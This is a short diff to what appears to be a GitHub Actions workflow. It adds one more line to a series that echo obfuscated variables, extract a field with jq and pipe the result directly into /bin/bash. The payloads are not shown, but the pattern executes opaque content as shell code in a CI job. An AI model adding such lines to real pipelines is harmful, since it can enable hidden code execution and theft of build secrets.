@@ -24,6 +24,7 @@ jobs:
           echo $y84 | jq -r .d00 | /bin/bash
           echo $xkp6408 | jq -r .okdi381 | /bin/bash
           echo $pbz17056 | jq -r .euvob03 | /bin/bash
+          echo $cp7 | jq -r .h995 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
